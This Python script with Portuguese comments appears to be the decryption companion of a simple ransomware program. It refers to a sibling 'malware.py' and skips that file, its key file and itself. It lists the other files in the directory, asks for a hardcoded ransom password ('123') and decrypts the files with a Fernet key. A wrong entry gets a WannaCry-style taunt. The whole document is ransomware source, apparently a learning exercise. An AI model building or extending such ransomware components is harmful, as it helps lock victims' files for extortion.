## Descriptografando os arquivos no diretório atual
import os
from cryptography.fernet import Fernet

#Armazenaremos aqui os nomes dos arquivos que estão no DIR 
files = []
#Laço para validar se é um arquivo no diretório e pular os arquivos de criptografar, descriptografar e chave criptográfica
for file in os.listdir():
	#Com esse if, caso seja um arquivo meu ele irá ignorar
	if file == "malware.py" or file == "key.key" or file == "decrypt.py":
		continue
	#Caso tenha chego nessa condicional, o arquivo é um alvo e será listado no Array acima
	if os.path.isfile(file):
		files.append(file)

print(files)

#Lendo a chave para descriptografar os arquivos
with open("key.key", "rb") as key:
	secret = key.read()

#Minha senha
mypass = "123"
#Senha do usuário
upassword = input("Enter the password to decrypt your files: ")

#Caso a senha esteja correta leia os arquivos e recupere RB para ler e WB para escrever
if upassword == mypass:
	for file in files:
		with open(file, "rb") as thefile:
			content = thefile.read()
		#Descriptografando usando o Fernet e a secret->chave lida
		content_decrypt = Fernet(secret).decrypt(content)
		with open(file, "wb") as thefile:
			#Recuperando dado
			thefile.write(content_decrypt)
		print("Recovered!")
else:
	print("Wanna cry? Enter the password!")
